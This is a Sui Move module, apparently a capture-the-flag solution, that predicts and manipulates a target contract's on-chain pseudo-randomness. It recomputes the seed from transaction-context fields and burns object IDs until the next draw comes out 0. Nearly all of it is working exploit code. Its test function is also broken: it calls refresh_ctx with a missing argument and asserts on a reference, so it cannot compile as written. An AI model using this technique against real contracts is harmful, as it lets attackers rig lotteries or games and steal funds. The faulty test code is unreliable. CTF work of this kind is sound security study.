module solve::hack_random {
    use std::hash;
    use std::vector;
    use sui::object;
    use sui::bcs;
    use sui::tx_context::TxContext;
    
    const ERR_HIGH_ARG_GREATER_THAN_LOW_ARG: u64 = 101;

    public fun my_seed(ctx: &mut TxContext): vector<u8> {
        let ctx_bytes = bcs::new(bcs::to_bytes(ctx));
        let _recover_address = bcs::peel_address(&mut ctx_bytes);
        let recover_tx_hash = bcs::peel_vec_u8(&mut ctx_bytes);
        let _recover_epoch = bcs::peel_u64(&mut ctx_bytes);
        let recover_ids_created = bcs::peel_u64(&mut ctx_bytes);

        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, recover_tx_hash);
        vector::append<u8>(&mut info, bcs::to_bytes(&recover_ids_created));
        let mock_uid_bytes: vector<u8> = hash::sha3_256(info);
        let len = vector::length(&mock_uid_bytes);
        assert!(len > 20, 101);
        while (len > 20) {
            let _ = vector::pop_back<u8>(&mut mock_uid_bytes);
            len = len - 1;
        };

        let ctx_bytes = bcs::to_bytes(ctx);

        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, ctx_bytes);
        vector::append<u8>(&mut info, mock_uid_bytes);
        let s = hash::sha3_256(info);
        s
    }

    public fun seed_with_offset(uid_offset: u64, ctx: &mut TxContext): vector<u8> {
        // let ctx_bytes = bcs::to_bytes(ctx);
        let ctx_bytes = bcs::new(bcs::to_bytes(ctx));
        let recover_address = bcs::peel_address(&mut ctx_bytes);
        let recover_tx_hash = bcs::peel_vec_u8(&mut ctx_bytes);
        let recover_epoch = bcs::peel_u64(&mut ctx_bytes);
        let recover_ids_created = bcs::peel_u64(&mut ctx_bytes);
        let ids_created = recover_ids_created + uid_offset;

        // mock uid bytes
        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, recover_tx_hash);
        vector::append<u8>(&mut info, bcs::to_bytes(&ids_created));
        let mock_uid_bytes: vector<u8> = hash::sha3_256(info);
        let len = vector::length(&mock_uid_bytes);
        assert!(len > 20, 101);
        while (len > 20) {
            let _ = vector::pop_back<u8>(&mut mock_uid_bytes);
            len = len - 1;
        };

        // ctx bytes
        let ctx_bytes: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut ctx_bytes, bcs::to_bytes(&recover_address));
        vector::append<u8>(&mut ctx_bytes, bcs::to_bytes(&recover_tx_hash));
        vector::append<u8>(&mut ctx_bytes, bcs::to_bytes(&recover_epoch));
        vector::append<u8>(&mut ctx_bytes, bcs::to_bytes(&ids_created));

        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, ctx_bytes);
        vector::append<u8>(&mut info, mock_uid_bytes);
        let s = hash::sha3_256(info);
        s
    }

    fun bytes_to_u64(bytes: vector<u8>): u64 {
        let value = 0u64;
        let i = 0u64;
        while (i < 8) {
            value = value | ((*vector::borrow(&bytes, i) as u64) << ((8 * (7 - i)) as u8));
            i = i + 1;
        };
        return value
    }

    /// Generate a random u64
    public fun rand_u64_with_seed(_seed: vector<u8>): u64 {
        bytes_to_u64(_seed)
    }


    /// Generate a random integer range in [low, high).
    public fun rand_u64_range_with_seed(_seed: vector<u8>, low: u64, high: u64): u64 {
        assert!(high > low, ERR_HIGH_ARG_GREATER_THAN_LOW_ARG);
        let value = rand_u64_with_seed(_seed);
        (value % (high - low)) + low
    }

    /// Generate a random integer range in [low, high).
    public fun rand_u64_range(low: u64, high: u64, ctx: &mut TxContext): u64 {
        rand_u64_range_with_seed(my_seed(ctx), low, high)
    }

    public fun rand_u64_range_with_offset(low: u64, high: u64, uid_offset: u64, ctx: &mut TxContext): u64 {
        let s = seed_with_offset(uid_offset, ctx);
        rand_u64_range_with_seed(s, low, high)
    }

    public fun refresh_ctx(offset: u64, ctx: &mut TxContext) {
        let time = 0;
        while(true) {
            let p = rand_u64_range_with_offset(0, 100, time, ctx);
            if (p == 0) {
                break
            };
            time = time + 1;
        };

        let i = 0;
        /// if without offset the next random is 0
        while (i < (time - offset)) {
            let id = object::new(ctx);
            object::delete(id);
            i = i + 1;
        };
    }

    #[test]
    fun test() {
        use sui::tx_context;
        use std::debug;

        use ctf::random;


        let admin = @0xf;
        // sha3(1)
        let tx_hash = x"67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2";
        let epoch = 1234;
        let ctx = tx_context::new(admin, tx_hash, epoch, 1);
        let ctx_mut = &mut ctx;


        let time = 0;
        while(true) {
            let p = rand_u64_range_with_offset(0, 100, time, ctx_mut);
            if (p == 0) {
                break
            };
            time = time + 1;
        };

        let i = 0;
        while (i < time) {
            let id = object::new(ctx_mut);
            object::delete(id);
            i = i + 1;
        };
        assert!(random::rand_u64_range(0, 100, ctx_mut) == 0, 0);

        object::delete(object::new(ctx_mut));
        refresh_ctx(ctx_mut);
        assert!(&random::rand_u64_range(0, 100, ctx_mut));
    }
}